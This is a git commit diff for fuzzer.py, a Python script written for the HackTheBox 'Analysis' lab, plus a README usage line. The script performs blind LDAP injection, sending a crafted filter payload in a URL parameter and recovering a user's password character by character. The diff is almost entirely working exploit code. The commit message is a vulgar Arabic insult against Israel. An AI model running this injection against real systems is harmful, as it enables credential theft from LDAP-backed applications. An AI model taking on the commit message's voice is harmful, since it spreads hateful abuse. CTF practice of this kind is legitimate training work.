fce64e3eb26f4e3add524212d8d23615e6f84294
Hunt3r0x <106396603+Hunt3r0x@users.noreply.github.com>
2024-01-23 01:15:02 +0200

    كسم إسرائيل

--- README.md
+++ README.md
@@ -2,5 +2,5 @@
 ## USAGE 
 
 ```bash
-python fuzzer.py --charset /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --url "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
+python3 fuzzer.py --charset /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --url "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
 ```
--- fuzzer.py
+++ fuzzer.py
@@ -2,56 +2,66 @@ import argparse
 import requests
 import urllib.parse
 
+
 def main(charset_path, base_url):
     found_chars = ""
     skip_count = 6
     add_star = True
 
     try:
-        with open(charset_path, 'r') as file:
+        with open(charset_path, "r") as file:
             charset = file.read().splitlines()
     except FileNotFoundError:
         print(f"Charset file not found: {charset_path}")
         return
 
-    while True:
-        found_new_char = False
-        for char in charset:
-            char = char.strip()
-            char_encoded = urllib.parse.quote(char)
+    try:
+        while True:
+            found_new_char = False
+            for char in charset:
+                char = char.strip()
+                char_encoded = urllib.parse.quote(char)
 
-            if '*' in char and skip_count > 0:
-                skip_count -= 1
-                continue
+                if "*" in char and skip_count > 0:
+                    skip_count -= 1
+                    continue
 
-            if '*' in char and add_star:
-                found_chars += char
-                print(f"[+] Found Character: {char}")
-                print(f"[+] Current Password: {found_chars}")
-                add_star = False
-                continue
-
-            modified_url = base_url.replace("{FUZZ}", char_encoded).replace("{found_char}", found_chars)
-
-            try:
-                response = requests.get(modified_url)
-                if "technician" in response.text and response.status_code == 200:
+                if "*" in char and add_star:
                     found_chars += char
-                    print(f"[+] Found Character: {char}")
-                    print(f"[+] Current Password: {found_chars}")
-                    found_new_char = True
-                    break
-            except requests.RequestException as e:
-                print(f"Request failed: {e}")
+                    print(f"Found Character: {char}")
+                    print(f"Current Password: {found_chars}")
+                    add_star = False
+                    continue
 
-        if not found_new_char:
-            break
+                modified_url = base_url.replace("{FUZZ}", char_encoded).replace(
+                    "{found_char}", found_chars
+                )
 
-    print(f"[+] Final Password: {found_chars}")
+                try:
+                    response = requests.get(modified_url)
+                    if "technician" in response.text and response.status_code == 200:
+                        found_chars += char
+                        print(f"Found Character ---> {char}")
+                        print(f"Current Password    ---> {found_chars}")
+                        found_new_char = True
+                        break
+                except requests.RequestException as e:
+                    print(f"Request failed: {e}")
+
+            if not found_new_char:
+                break
+
+    except KeyboardInterrupt:
+        print("\n[!] User interruption detected. Exiting...")
+    finally:
+        print(f"Final Password (if found): {found_chars}")
+
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Fuzzing tool for CTF challenges")
-    parser.add_argument("-c", "--charset", required=True, help="Path to the charset file")
+    parser = argparse.ArgumentParser(description="ldap injection fuzzer script for password extract for HTB Analysis box")
+    parser.add_argument(
+        "-c", "--charset", required=True, help="Path to the charset file"
+    )
     parser.add_argument("-u", "--url", required=True, help="Base URL for fuzzing")
     args = parser.parse_args()
 
